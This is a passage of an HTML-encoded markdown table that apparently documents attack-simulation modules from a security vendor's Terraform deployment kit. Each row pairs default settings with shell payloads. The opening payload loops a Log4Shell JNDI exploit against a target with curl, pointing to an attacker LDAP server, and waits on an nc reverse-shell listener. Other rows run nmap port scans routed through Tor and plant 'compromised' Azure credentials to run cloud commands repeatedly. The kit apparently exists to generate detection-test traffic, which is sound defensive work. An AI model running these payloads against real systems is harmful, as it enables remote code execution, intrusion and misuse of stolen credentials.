$ATTACKER&amp;&amp;#35;95;IP:$REVERSE&amp;&amp;#35;95;SHELL&amp;&amp;#35;95;PORT&quot;<br/>            while &amp;#33; nc &amp;#45;z &amp;#45;w 5 &amp;#45;vv $ATTACKER&amp;&amp;#35;95;IP $REVERSE&amp;&amp;#35;95;SHELL&amp;&amp;#35;95;PORT &gt; /dev/null; do<br/>                log &quot;failed check &amp;#45; waiting for attacker reverse shell: $ATTACKER&amp;&amp;#35;95;IP:$REVERSE&amp;&amp;#35;95;SHELL&amp;&amp;#35;95;PORT&quot;;<br/>                sleep 30;<br/>                if &amp;#33; screen &amp;#45;ls &amp;#124; grep jndiexploit; then<br/>                    log &quot;screen session no longer running&amp;#46;&amp;#46;&amp;#46;reset required&quot;<br/>                fi<br/>                if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>                    log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>                    rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>                    break 2<br/>                fi<br/>            done;<br/>            log &quot;attacker reverse shell available&quot;;<br/>        fi<br/>        sleep 30;<br/>        if &amp;#33; screen &amp;#45;ls &amp;#124; grep jndiexploit; then<br/>            log &quot;screen session no longer running&amp;#46;&amp;#46;&amp;#46;reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;sending payload: curl &amp;#45;&amp;#45;verbose $TARGET&amp;&amp;#35;95;IP:$TARGET&amp;&amp;#35;95;PORT &amp;#45;H &#x27;X&amp;#45;Api&amp;#45;Version: &amp;&amp;#35;92;$$&amp;&amp;#35;123;jndi:ldap://$ATTACKER&amp;&amp;#35;95;IP:$ATTACKER&amp;&amp;#35;95;LDAP&amp;&amp;#35;95;PORT/$EXEC&amp;&amp;#35;95;TYPE/$BASE64&amp;&amp;#35;95;PAYLOAD&amp;&amp;#35;125;&#x27;&quot;<br/>        /bin/bash &amp;#45;c &quot;curl &amp;#45;&amp;#45;verbose $TARGET&amp;&amp;#35;95;IP:$TARGET&amp;&amp;#35;95;PORT &amp;#45;H &#x27;X&amp;#45;Api&amp;#45;Version: &amp;&amp;#35;92;$$&amp;&amp;#35;123;jndi:ldap://$ATTACKER&amp;&amp;#35;95;IP:$ATTACKER&amp;&amp;#35;95;LDAP&amp;&amp;#35;95;PORT/$EXEC&amp;&amp;#35;95;TYPE/$BASE64&amp;&amp;#35;95;PAYLOAD&amp;&amp;#35;125;&#x27;&quot;<br/>        log &quot;done&quot;;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;waiting $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; seconds&amp;#46;&amp;#46;&amp;#46;&quot;;<br/>            sleep $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;git openjdk&amp;#45;11&amp;#45;jdk unzip&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;git java&amp;#45;11&amp;#45;openjdk java&amp;#45;11&amp;#45;openjdk&amp;#45;devel unzip&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| attacker-runbook-execute-docker-nmap                     | ./modules/runbook/execute-docker-nmap                | runbook_exec_docker_nmap_attacker                | context.azure.runbook.attacker.execute.docker_nmap                | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;docker_nmap&quot;: {<br/>                            &quot;attack_delay&quot;: 50400,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;ports&quot;: [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            &quot;scan_local_network&quot;: false,<br/>                            &quot;targets&quot;: [],<br/>                            &quot;use_tor&quot;: true<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre> | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                | <pre>locals &amp;&amp;#35;123;<br/>    attack&amp;&amp;#35;95;dir = &quot;/nmap&quot;<br/>    attack&amp;&amp;#35;95;script = &quot;nmap&amp;#46;sh&quot;<br/>    start&amp;&amp;#35;95;script = &quot;delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;<br/>    lock&amp;&amp;#35;95;file = &quot;/tmp/delay&amp;&amp;#35;95;nmap&amp;#46;lock&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    cd $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        log &quot;starting script&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        LOCAL&amp;&amp;#35;95;NET=$&amp;&amp;#35;40;ip &amp;#45;o &amp;#45;f inet addr show &amp;#124; awk &#x27;/scope global/ &amp;&amp;#35;123;print $4&amp;&amp;#35;125;&#x27; &amp;#124; head &amp;#45;1&amp;&amp;#35;41;<br/>        log &quot;LOCAL&amp;&amp;#35;95;NET: $LOCAL&amp;&amp;#35;95;NET&quot;<br/>        log &quot;Targets: $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;,&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;targets&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot;<br/>        echo &quot;$&amp;&amp;#35;123; length&amp;&amp;#35;40;var&amp;#46;inputs&amp;&amp;#35;91;&quot;targets&quot;&amp;&amp;#35;93;&amp;&amp;#35;41; &gt; 0 ? join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;n&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;targets&quot;&amp;&amp;#35;93;&amp;&amp;#35;41; : &quot;$LOCAL&amp;&amp;#35;95;NET&quot; &amp;&amp;#35;125;&quot; &gt; /tmp/nmap&amp;#45;targets&amp;#46;txt<br/>        log &quot;Ports: $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;,&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;ports&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot;<br/>        if docker ps &amp;#45;a &amp;#124; grep $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;; then <br/>            docker stop $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>            docker rm $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        fi<br/>        $&amp;&amp;#35;123; var&amp;#46;inputs&amp;&amp;#35;91;&quot;use&amp;&amp;#35;95;tor&quot;&amp;&amp;#35;93; == true ? &lt;&lt;&amp;#45;EOF<br/>        log &quot;Using tor network&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        if &amp;#33; docker ps &amp;#124; grep torproxy &gt; /dev/null; then<br/>        docker run &amp;#45;d &amp;#45;&amp;#45;rm &amp;#45;&amp;#45;name torproxy &amp;#45;p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$&amp;&amp;#35;40;docker inspect &amp;#45;f &#x27;&amp;&amp;#35;123;&amp;&amp;#35;123;range &amp;#46;NetworkSettings&amp;#46;Networks&amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;123;&amp;&amp;#35;123;&amp;#46;IPAddress&amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;123;&amp;&amp;#35;123;end&amp;&amp;#35;125;&amp;&amp;#35;125;&#x27; torproxy&amp;&amp;#35;41;<br/>        log &quot;Running via docker: proxychains nmap &amp;#45;Pn &amp;#45;sT &amp;#45;T2 &amp;#45;oX /tmp/scan&amp;#46;xml &amp;#45;p$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;,&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;ports&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#45;iL /tmp/nmap&amp;#45;targets&amp;#46;txt&quot;<br/>        /bin/bash &amp;#45;c &quot;docker run &amp;#45;v /tmp:/tmp &amp;#45;e TORPROXY=$TORPROXY &amp;#45;&amp;#45;name $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;image&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; nmap &amp;#45;Pn &amp;#45;sT &amp;#45;T2 &amp;#45;oX /tmp/scan&amp;#46;xml &amp;#45;p$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;,&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;ports&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#45;iL /tmp/nmap&amp;#45;targets&amp;#46;txt &amp;#124;&amp;#124; true&quot; <br/>        /bin/bash &amp;#45;c &quot;docker logs $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash &amp;#45;c &quot;docker rm $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>        EOF<br/>        : &lt;&lt;&amp;#45;EOF<br/>        log &quot;Running via docker: nmap &amp;#45;Pn &amp;#45;sS &amp;#45;T2 &amp;#45;oX /tmp/scan&amp;#46;xml &amp;#45;p$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;,&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;ports&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#45;iL /tmp/nmap&amp;#45;targets&amp;#46;txt&quot;<br/>        /bin/bash &amp;#45;c &quot;docker run &amp;#45;&amp;#45;rm &amp;#45;v /tmp:/tmp &amp;#45;&amp;#45;entrypoint=nmap &amp;#45;&amp;#45;name $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;image&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &amp;#45;Pn &amp;#45;sT &amp;#45;T2 &amp;#45;oX /tmp/scan&amp;#46;xml &amp;#45;p$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;,&quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;ports&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#45;iL /tmp/nmap&amp;#45;targets&amp;#46;txt &amp;#124;&amp;#124; true&quot;<br/>        /bin/bash &amp;#45;c &quot;docker logs $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash &amp;#45;c &quot;docker rm $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;container&amp;&amp;#35;95;name&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;&quot;<br/>        EOF<br/>        &amp;&amp;#35;125;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            log &quot;waiting $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;&amp;&amp;#35;125; seconds&amp;#46;&amp;#46;&amp;#46;&quot;;<br/>            sleep $&amp;&amp;#35;123;var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;&amp;&amp;#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/><br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        log &quot;Checking for docker&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        while &amp;#33; command &amp;#45;v docker &gt; /dev/null &amp;#124;&amp;#124; &amp;#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&amp;&amp;#35;40;command &amp;#45;v  docker&amp;&amp;#35;41;&quot;<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = var&amp;#46;inputs&amp;&amp;#35;91;&quot;attack&amp;&amp;#35;95;delay&quot;&amp;&amp;#35;93;<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| attacker-runbook-execute-generate-azure-cli-traffic      | ./modules/runbook/execute-generate-azure-cli-traffic | runbook_exec_generate_azure_cli_traffic_attacker | context.azure.runbook.attacker.execute.generate_azure_cli_traffic | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;generate_azure_cli_traffic&quot;: {<br/>                            &quot;commands&quot;: [],<br/>                            &quot;compromised_credentials&quot;: {},<br/>                            &quot;compromised_keys_user&quot;: null,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;profile&quot;: &quot;azure-traffic&quot;<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-azure-cli-traffic | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;az&quot;<br/>    attack&amp;&amp;#35;95;dir = &quot;/generate&amp;#45;azure&amp;#45;cli&amp;#45;traffic&quot;<br/>    azure&amp;&amp;#35;95;creds = var&amp;#46;inputs&amp;&amp;#35;91;&quot;compromised&amp;&amp;#35;95;credentials&quot;&amp;&amp;#35;93;&amp;&amp;#35;91;var&amp;#46;inputs&amp;&amp;#35;91;&quot;compromised&amp;&amp;#35;95;keys&amp;&amp;#35;95;user&quot;&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;#46;rendered<br/>    azure&amp;&amp;#35;95;commands = join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;n&quot;, &amp;&amp;#35;91; for command in var&amp;#46;inputs&amp;&amp;#35;91;&quot;commands&quot;&amp;&amp;#35;93;: &quot;$&amp;&amp;#35;123;command&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;41;<br/><br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    rm &amp;#45;rf $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    mkdir &amp;#45;p $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    cd $&amp;&amp;#35;123;local&amp;#46;attack&amp;&amp;#35;95;dir&amp;&amp;#35;125;<br/>    log &quot;Deploying azure credentials&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    mkdir &amp;#45;p ~/&amp;#46;azure<br/>    if &amp;&amp;#35;91;  &quot;$&amp;&amp;#35;123; local&amp;#46;azure&amp;&amp;#35;95;creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; &amp;&amp;#35;125;&quot; == &quot;true&quot; &amp;&amp;#35;93;; then<br/>      echo $&amp;&amp;#35;123;base64gzip&amp;&amp;#35;40;local&amp;#46;azure&amp;&amp;#35;95;creds&amp;&amp;#35;41;&amp;&amp;#35;125; &amp;#124; base64 &amp;#45;d &amp;#124; gunzip &gt; ~/&amp;#46;azure/my&amp;#46;azureauth<br/>      export AZURE&amp;&amp;#35;95;AUTH&amp;&amp;#35;95;LOCATION=~/&amp;#46;azure/my&amp;#46;azureauth<br/>    fi<br/>    log &quot;Running azure commands&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    START&amp;&amp;#35;95;HASH=$&amp;&amp;#35;40;sha256sum &amp;#45;&amp;#45;text /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME &amp;#124; awk &#x27;&amp;&amp;#35;123; print $1 &amp;&amp;#35;125;&#x27;&amp;&amp;#35;41;<br/>    while true; do<br/>        $&amp;&amp;#35;123;local&amp;#46;azure&amp;&amp;#35;95;commands&amp;&amp;#35;125;<br/>        log &#x27;waiting 30 minutes&amp;#46;&amp;#46;&amp;#46;&#x27;;<br/>        sleep 1800<br/>        if &amp;#33; check&amp;&amp;#35;95;payload&amp;&amp;#35;95;update /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME $START&amp;&amp;#35;95;HASH; then<br/>            log &quot;payload update detected &amp;#45; exiting loop and forcing payload download&quot;<br/>            rm &amp;#45;f /tmp/payload&amp;&amp;#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&amp;#46;&quot;<br/>    EOT<br/>    <br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &gt; /dev/null; do<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &gt; /dev/null; do<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found or not ready &amp;#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        